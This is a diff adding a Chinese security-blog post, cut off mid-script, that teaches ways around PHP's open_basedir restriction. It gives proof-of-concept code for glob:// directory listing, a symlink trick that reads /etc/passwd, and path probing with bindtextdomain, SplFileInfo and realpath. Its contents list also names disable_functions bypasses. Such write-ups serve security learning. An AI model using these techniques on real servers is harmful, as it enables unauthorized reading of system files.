@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="PHP.ini相关配置绕过 本来想发两篇的，但是转念一想disable_function和open_basedir其实都是属于php配置层上的限制，于是就写了这篇文章直接一锅端  open_basedir">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php.ini相关配置绕过">
+<meta property="og:url" content="https://ayan0.top/2025/09/11/php-ini%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E7%BB%95%E8%BF%87/">
+<meta property="og:site_name" content="Blog of AyaN0">
+<meta property="og:description" content="PHP.ini相关配置绕过 本来想发两篇的，但是转念一想disable_function和open_basedir其实都是属于php配置层上的限制，于是就写了这篇文章直接一锅端  open_basedir">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250910171344853.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250910180550554.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini1.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini2.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini3.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini4.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/phpini5.png">
+<meta property="article:published_time" content="2025-09-11T10:31:01.000Z">
+<meta property="article:modified_time" content="2025-09-17T07:44:25.608Z">
+<meta property="article:author" content="AyaN0">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250910171344853.png">
+
+
+<link rel="canonical" href="https://ayan0.top/2025/09/11/php-ini%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E7%BB%95%E8%BF%87/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/09/11/php-ini%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E7%BB%95%E8%BF%87/","path":"2025/09/11/php-ini相关配置绕过/","title":"php.ini相关配置绕过"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>php.ini相关配置绕过 | Blog of AyaN0</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog of AyaN0</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#phpini%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text"> PHP.ini相关配置绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#open_basedir"><span class="nav-number">1.1.</span> <span class="nav-text"> open_basedir</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 系统命令函数绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8glob%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 利用glob:&#x2F;&#x2F;绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-directoryiteratorglob"><span class="nav-number">1.1.2.1.</span> <span class="nav-text"> 利用 DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-opendirreaddirglob"><span class="nav-number">1.1.2.2.</span> <span class="nav-text"> 利用 opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-scandirglob"><span class="nav-number">1.1.2.3.</span> <span class="nav-text"> 利用 scandir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8symlink%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 利用symlink绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8bindtextdomain%E5%92%8Csplfileinfo%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.4.</span> <span class="nav-text"> 利用bindtextdomain和SplFileInfo方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8splfileinfogetrealpath%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.5.</span> <span class="nav-text"> 利用SplFileInfo::getRealPath()方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8realpath%E5%88%97%E7%9B%AE%E5%BD%95"><span class="nav-number">1.1.6.</span> <span class="nav-text"> 利用realpath列目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gd%E5%BA%93imageftbboximagefttext%E5%88%97%E4%B8%BE%E7%9B%AE%E5%BD%95"><span class="nav-number">1.1.7.</span> <span class="nav-text"> GD库imageftbbox&#x2F;imagefttext列举目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8chdir%E4%B8%8Eini_set"><span class="nav-number">1.1.8.</span> <span class="nav-text"> 利用chdir与ini_set</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl%E7%BB%95%E8%BF%87"><span class="nav-number">1.1.9.</span> <span class="nav-text"> Curl绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#disable_function%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text"> disable_function绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%BF%E7%9C%BC%E7%9B%AF%E7%9C%9F"><span class="nav-number">1.2.1.</span> <span class="nav-text"> 亿眼盯真</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-ld_preload-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.2.</span> <span class="nav-text"> 利用 LD_PRELOAD 环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8imap_open%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.3.</span> <span class="nav-text"> 利用imap_open()绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows%E7%BB%84%E4%BB%B6dcom%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.4.</span> <span class="nav-text"> Windows组件DCOM绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-%E4%BB%BB%E6%84%8F%E5%BA%93%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.2.5.</span> <span class="nav-text"> curl 任意库加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%9A%81%E5%89%91%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="nav-number">1.2.6.</span> <span class="nav-text"> 蚁剑一把梭</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8imagemagick-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87cve-20163714"><span class="nav-number">1.2.7.</span> <span class="nav-text"> 利用ImageMagick 漏洞绕过(CVE-2016–3714)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#backtraceuaf"><span class="nav-number">1.2.8.</span> <span class="nav-text"> BacktraceUAF</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/09/11/php-ini%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="php.ini相关配置绕过 | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php.ini相关配置绕过
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-11 18:31:01" itemprop="dateCreated datePublished" datetime="2025-09-11T18:31:01+08:00">2025-09-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-09-17 15:44:25" itemprop="dateModified" datetime="2025-09-17T15:44:25+08:00">2025-09-17</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>11k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>21 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="phpini相关配置绕过"><a class="markdownIt-Anchor" href="#phpini相关配置绕过"></a> PHP.ini相关配置绕过</h1>
+<p>本来想发两篇的，但是转念一想disable_function和open_basedir其实都是属于php配置层上的限制，于是就写了这篇文章直接一锅端</p>
+<h2 id="open_basedir"><a class="markdownIt-Anchor" href="#open_basedir"></a> open_basedir</h2>
+<p>open_basedir是把可访问的文件限制在指定的范围下</p>
+<p><code>file_get_contents,highlight_file</code>这些函数都会受到限制。</p>
+<h3 id="系统命令函数绕过"><a class="markdownIt-Anchor" href="#系统命令函数绕过"></a> 系统命令函数绕过</h3>
+<p>能执行system这些函数基本就能绕过，但是大部分的时候被waf/受到了disable_function的限制</p>
+<h3 id="利用glob绕过"><a class="markdownIt-Anchor" href="#利用glob绕过"></a> 利用glob://绕过</h3>
+<p>glob://是查找匹配的文件路径模式,<code>glob</code>数据流包装器自 PHP 5.3.0 起开始有效。</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="comment">// 循环 ext/spl/examples/ 目录里所有 *.php 文件</span>
+<span class="comment">// 并打印文件名和文件尺寸</span>
+<span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://ext/spl/examples/*.php&quot;</span>);
+<span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;
+    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s: %.1FK\n&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>(), <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getSize</span>()/<span class="number">1024</span>);
+&#125;
+<span class="meta">?&gt;</span></code></pre>
+<p>需要配合其他函数来配合打组合技，单独的glob是不能绕过的</p>
+<h4 id="利用-directoryiteratorglob"><a class="markdownIt-Anchor" href="#利用-directoryiteratorglob"></a> 利用 DirectoryIterator+glob://</h4>
+<p><code>DirectoryIterator</code> 类提供了一个简单的界面来查看文件系统目录的内容。<br>
+脚本如下:</p>
+<pre><code class="highlight plaintext">&lt;?php
+$c = $_GET[&#x27;c&#x27;];
+$a = new DirectoryIterator($c);
+foreach($a as $f)&#123;
+    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);
+&#125;
+?&gt;</code></pre>
+<h4 id="利用-opendirreaddirglob"><a class="markdownIt-Anchor" href="#利用-opendirreaddirglob"></a> 利用 opendir()+readdir()+glob://</h4>
+<p><code>opendir</code>作用为打开目录句柄<br>
+<code>readdir</code>作用为从目录句柄中读取目录</p>
+<p>脚本如下</p>
+<pre><code class="highlight plaintext">&lt;?php
+$a = $_GET[&#x27;c&#x27;];
+if ( $b = opendir($a) ) &#123;
+    while ( ($file = readdir($b)) !== false ) &#123;
+        echo $file.&quot;&lt;br&gt;&quot;;
+    &#125;
+    closedir($b);
+&#125;
+?&gt;</code></pre>
+<p>只能列目录，php7可以用如下方法读非根目录文件,<code>glob:///*/www/../*</code> 可列举 <code>/var</code></p>
+<h4 id="利用-scandirglob"><a class="markdownIt-Anchor" href="#利用-scandirglob"></a> 利用 scandir()+glob://</h4>
+<p>直接命令执行</p>
+<pre><code class="highlight plaintext">var_dump(scandir(&#x27;glob:///*&#x27;));</code></pre>
+<h3 id="利用symlink绕过"><a class="markdownIt-Anchor" href="#利用symlink绕过"></a> 利用symlink绕过</h3>
+<p><code>symlink</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。</p>
+<pre><code class="highlight plaintext">symlink(string $target, string $link): bool</code></pre>
+<p>而target一般受限于我们的open_basedir,v于是乎要想办法把首先的内容通过软链接带出到不受限的区域下</p>
+<pre><code class="highlight plaintext">&lt;?php
+mkdir(&quot;A&quot;);
+chdir(&quot;A&quot;);
+mkdir(&quot;B&quot;);
+chdir(&quot;B&quot;);
+mkdir(&quot;C&quot;);
+chdir(&quot;C&quot;);
+mkdir(&quot;D&quot;);
+chdir(&quot;D&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+symlink(&quot;A/B/C/D&quot;,&quot;SD&quot;);
+symlink(&quot;SD/../../../../etc/passwd&quot;,&quot;POC&quot;);
+unlink(&quot;SD&quot;);
+mkdir(&quot;SD&quot;);
+//file_get_contents(&#x27;/var/www/html/SD&#x27;);
+?&gt;</code></pre>
+<p>这是一个读取/etc/passwd的poc，原理相似的，我们也可以用它移动到其他的文件到open_basedir的范围内进行文件带出</p>
+<p>至于原理直接引用这篇[博客](<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9520">从0学习bypass open_basedir姿势-先知社区</a>)的内容来进行解释</p>
+<pre><code class="highlight plaintext">1.创建A/B/C/D目录，并返回到起始目录
+2.symlink(&quot;A/B/C/D&quot;,&quot;SD&quot;):创建符号文件SD,指向A/B/C/D
+3.symlink(&quot;SD/../../../../etc/passwd&quot;,&quot;POC&quot;):创建符号文件POC,指向SD/../../../../etc/passwd。此时SD=A/B/C/D,而A/B/C/D../../../../=/var/www/html,符合open_basedir的限制,创建成功。
+4.unlink(&quot;SD&quot;):删除软链接SD，并创建一个文件夹,此时SD作为一个真正的目录存在。那么访问POC,指向的是SD/../../../../etc/passwd,SD/../../../就是/var目录,/var/../etc/passwd恰好可以读取到etc目录下的passwd，从而达到跨目录访问的效果。</code></pre>
+<h3 id="利用bindtextdomain和splfileinfo方法"><a class="markdownIt-Anchor" href="#利用bindtextdomain和splfileinfo方法"></a> 利用bindtextdomain和SplFileInfo方法</h3>
+<p><code>bindtextdomain</code>设置或获取域名的路径，函数原型为:</p>
+<pre><code class="highlight plaintext">bindtextdomain(string $domain, ?string $directory): string|false</code></pre>
+<p>利用原理是基于报错：<code>bindtextdomain()</code>函数的第二个参数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>i</mi><mi>r</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>o</mi><mi>r</mi><mi>y</mi><mtext>是一个文件路径，它会在</mtext></mrow><annotation encoding="application/x-tex">directory是一个文件路径，它会在</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">路</span><span class="mord cjk_fallback">径</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">它</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">在</span></span></span></span>directory存在的时候返回$directory，不存在则返回false。</p>
+<p>Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而windows环境下一般是没有bindtextdomain函数的，linux环境是默认存在这个函数。<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250910171344853.png" alt="image-20250910171344853"></p>
+<p><code>SplFileInfo</code>函数进行的操作类似。</p>
+<p>poc</p>
+<pre><code class="highlight plaintext">&lt;?php
+printf(&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;, ini_get(&#x27;open_basedir&#x27;));
+$re = bindtextdomain(&#x27;xxx&#x27;, $_GET[&#x27;dir&#x27;]);
+var_dump($re);
+?&gt;
+&lt;?php
+printf(&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;, ini_get(&#x27;open_basedir&#x27;));
+$info = new SplFileInfo($_GET[&#x27;dir&#x27;]);
+var_dump($info-&gt;getRealPath());
+?&gt;</code></pre>
+<p>如果访问到存在的文件就会返回该文件的路径,如果是不存在的路径就会返回<code>false</code></p>
+<p>有点鸡肋但是爆爆还是可以出来</p>
+<h3 id="利用splfileinfogetrealpath方法"><a class="markdownIt-Anchor" href="#利用splfileinfogetrealpath方法"></a> 利用SplFileInfo::getRealPath()方法</h3>
+<p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)<br>
+SplFileInfo类为单个文件的信息提供了一个高级的面向对象的接口。<br>
+而其中<code>getRealPath()</code>用于获取文件的绝对路径。bypass原理同样是基于报错，该方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了open_basedir的设定。</p>
+<p>可以用这个脚本来尝试遍历</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));
+<span class="title function_ invoke__">printf</span>(<span class="string">&quot;open_basedir: %s \n&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));
+<span class="variable">$basedir</span> = <span class="string">&quot;D:/phpstudy_pro/WWW/debug.io/&quot;</span>;
+<span class="variable">$arr</span> = <span class="keyword">array</span>();
+<span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;
+<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123;
+    <span class="variable">$info</span> = <span class="keyword">new</span> <span class="built_in">SplFileInfo</span>(<span class="variable">$basedir</span> . <span class="variable">$chars</span>[<span class="variable">$i</span>] . <span class="string">&#x27;&lt;&lt;&#x27;</span>);
+    <span class="variable">$re</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();
+    <span class="keyword">if</span> (<span class="variable">$re</span>) &#123;
+        <span class="keyword">echo</span> <span class="variable">$re</span>.<span class="string">&quot;\n&quot;</span>;
+    &#125;
+&#125;</code></pre>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250910180550554.png" alt></p>
+<h3 id="利用realpath列目录"><a class="markdownIt-Anchor" href="#利用realpath列目录"></a> 利用realpath列目录</h3>
+<p>要求环境是<strong>Windows</strong></p>
+<p>realpath()返回规范化的绝对路径名,它可以去掉多余的…/或./等跳转字符，能将相对路径转换成绝对路径。</p>
+<pre><code class="highlight php"><span class="title function_ invoke__">realpath</span>(<span class="keyword">string</span> <span class="variable">$path</span>): <span class="keyword">string</span>|<span class="literal">false</span></code></pre>
+<p>如果我们传入一个不在open_basedir里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，有点像盲注,基于报错来判断文件名</p>
+<p>可以用这个脚本来尝试遍历</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));
+<span class="title function_ invoke__">printf</span>(<span class="string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));
+<span class="title function_ invoke__">set_error_handler</span>(<span class="string">&#x27;isexists&#x27;</span>);
+<span class="variable">$dir</span> = <span class="string">&#x27;D:/phpstudy_pro/WWW/&#x27;</span>;
+<span class="variable">$file</span> = <span class="string">&#x27;&#x27;</span>;
+<span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;
+<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>); <span class="variable">$i</span>++) &#123;
